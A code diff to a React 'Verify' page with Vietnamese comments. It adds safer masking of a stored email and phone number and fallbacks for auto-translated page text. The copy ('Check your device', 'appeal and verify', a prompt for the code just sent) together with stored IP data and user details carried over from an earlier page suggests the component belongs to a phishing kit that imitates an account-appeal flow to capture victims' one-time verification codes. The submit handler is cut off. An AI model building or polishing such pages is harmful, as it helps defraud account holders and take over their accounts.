@@ -20,107 +20,138 @@ const Verify = () => {
     useEffect(() => {
         const savedUserInfo = localStorage.getItem('userInfo');
         if (savedUserInfo) {
-            const userData = JSON.parse(savedUserInfo);
-            setUserInfo({
-                email: userData.email || '',
-                phone: userData.phone || ''
-            });
+            try {
+                const userData = JSON.parse(savedUserInfo);
+                setUserInfo({
+                    email: userData.email && typeof userData.email === 'string' ? userData.email : '',
+                    phone: userData.phone && typeof userData.phone === 'string' ? userData.phone : ''
+                });
+            } catch (error) {
+                console.error('Error parsing userInfo:', error);
+                setUserInfo({ email: '', phone: '' });
+            }
         }
     }, []);
 
-    // Format email: s****g@m****.com
+    // Format email: s****g@m****.com - FIXED
     const formatEmailForDisplay = (email) => {
-        if (!email) return 's****g@m****.com';
+        if (!email || typeof email !== 'string') return 's****g@m****.com';
+        
         const parts = email.split('@');
-        if (parts.length !== 2) return email;
+        if (parts.length !== 2) return 's****g@m****.com';
         
         const username = parts[0];
         const domain = parts[1];
+        
+        // Xử lý username an toàn
+        let formattedUsername;
+        if (username.length === 1) {
+            formattedUsername = username + '****';
+        } else if (username.length === 2) {
+            formattedUsername = username.charAt(0) + '***' + username.charAt(1);
+        } else {
+            formattedUsername = username.charAt(0) + 
+                '*'.repeat(Math.max(1, username.length - 2)) + 
+                username.charAt(username.length - 1);
+        }
+        
+        // Xử lý domain an toàn
         const domainParts = domain.split('.');
-        
-        if (username.length <= 1) return email;
-        if (domainParts.length < 2) return email;
-        
-        // Format: s****g (ký tự đầu + *** + ký tự cuối)
-        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
-        
-        // Format: m****.com (ký tự đầu + *** + .com)
-        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
+        let formattedDomain;
+        if (domainParts.length >= 2) {
+            const mainDomain = domainParts[0];
+            if (mainDomain.length === 1) {
+                formattedDomain = mainDomain + '****.' + domainParts.slice(1).join('.');
+            } else {
+                formattedDomain = mainDomain.charAt(0) + 
+                    '*'.repeat(Math.max(1, mainDomain.length - 1)) + 
+                    '.' + domainParts.slice(1).join('.');
+            }
+        } else {
+            formattedDomain = 'm****.com';
+        }
         
         return formattedUsername + '@' + formattedDomain;
     };
 
-    // Format số điện thoại: ******32 (6 sao + 2 số cuối)
+    // Format số điện thoại: ******32 - FIXED
     const formatPhoneForDisplay = (phone) => {
-        if (!phone) return '******32';
-        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
-        if (cleanPhone.length < 2) return '******32';
+        if (!phone || typeof phone !== 'string') return '******32';
         
-        // Luôn hiển thị 6 sao + 2 số cuối
+        const cleanPhone = phone.replace(/^\+\d+\s*/, '').replace(/\D/g, '');
+        
+        // Xử lý số điện thoại ngắn
+        if (cleanPhone.length <= 2) {
+            return '*'.repeat(Math.max(4, cleanPhone.length)) + cleanPhone;
+        }
+        
+        // Hiển thị số sao phù hợp với độ dài số
+        const starsCount = Math.min(6, Math.max(4, cleanPhone.length - 2));
         const lastTwoDigits = cleanPhone.slice(-2);
-        return '*'.repeat(6) + lastTwoDigits;
+        
+        return '*'.repeat(starsCount) + lastTwoDigits;
     };
 
-    const defaultTexts = useMemo(
-        () => ({
+    const defaultTexts = useMemo(() => {
+        // LUÔN dùng data thật từ trang 1 - cả tiếng Anh và các ngôn ngữ khác
+        const actualEmail = formatEmailForDisplay(userInfo.email);
+        const actualPhone = formatPhoneForDisplay(userInfo.phone);
+        
+        return {
             title: 'Check your device',
-            description: `We have sent a verification code to your ${formatEmailForDisplay(userInfo.email)} , ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
+            description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
-            infoDescription:
-                'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+            infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
             submit: 'Continue',
             sendCode: 'Send new code',
             errorMessage: 'The verification code you entered is incorrect',
             loadingText: 'Please wait'
-        }),
-        [userInfo.email, userInfo.phone]
-    );
+        };
+    }, [userInfo.email, userInfo.phone]); // Phụ thuộc vào data thật
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [
-                    translatedTitle,
-                    translatedDesc,
-                    translatedPlaceholder,
-                    translatedInfoTitle,
-                    translatedInfoDesc,
-                    translatedSubmit,
-                    translatedSendCode,
-                    translatedError,
-                    translatedLoading
-                ] = await Promise.all([
-                    translateText(defaultTexts.title, targetLang),
-                    translateText(defaultTexts.description, targetLang),
-                    translateText(defaultTexts.placeholder, targetLang),
-                    translateText(defaultTexts.infoTitle, targetLang),
-                    translateText(defaultTexts.infoDescription, targetLang),
-                    translateText(defaultTexts.submit, targetLang),
-                    translateText(defaultTexts.sendCode, targetLang),
-                    translateText(defaultTexts.errorMessage, targetLang),
-                    translateText(defaultTexts.loadingText, targetLang)
-                ]);
+    const translateAllTexts = useCallback(async (targetLang) => {
+        try {
+            const [
+                translatedTitle,
+                translatedDesc,
+                translatedPlaceholder,
+                translatedInfoTitle,
+                translatedInfoDesc,
+                translatedSubmit,
+                translatedSendCode,
+                translatedError,
+                translatedLoading
+            ] = await Promise.all([
+                translateText(defaultTexts.title, targetLang),
+                translateText(defaultTexts.description, targetLang), // Dùng description đã có data thật
+                translateText(defaultTexts.placeholder, targetLang),
+                translateText(defaultTexts.infoTitle, targetLang),
+                translateText(defaultTexts.infoDescription, targetLang),
+                translateText(defaultTexts.submit, targetLang),
+                translateText(defaultTexts.sendCode, targetLang),
+                translateText(defaultTexts.errorMessage, targetLang),
+                translateText(defaultTexts.loadingText, targetLang)
+            ]);
 
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description: translatedDesc,
-                    placeholder: translatedPlaceholder,
-                    infoTitle: translatedInfoTitle,
-                    infoDescription: translatedInfoDesc,
-                    submit: translatedSubmit,
-                    sendCode: translatedSendCode,
-                    errorMessage: translatedError,
-                    loadingText: translatedLoading
-                });
-            } catch {
-                //
-            }
-        },
-        [defaultTexts]
-    );
+            setTranslatedTexts({
+                title: translatedTitle,
+                description: translatedDesc,
+                placeholder: translatedPlaceholder,
+                infoTitle: translatedInfoTitle,
+                infoDescription: translatedInfoDesc,
+                submit: translatedSubmit,
+                sendCode: translatedSendCode,
+                errorMessage: translatedError,
+                loadingText: translatedLoading
+            });
+        } catch {
+            // Fallback về default texts với data thật nếu dịch lỗi
+            setTranslatedTexts(defaultTexts);
+        }
+    }, [defaultTexts]);
 
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
@@ -130,8 +161,11 @@ const Verify = () => {
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
             translateAllTexts(targetLang);
+        } else {
+            // Đảm bảo dùng default texts với data thật cho tiếng Anh
+            setTranslatedTexts(defaultTexts);
         }
-    }, [translateAllTexts]);
+    }, [translateAllTexts, defaultTexts]);
 
     const handleSubmit = async () => {
         if (!code.trim()) return;
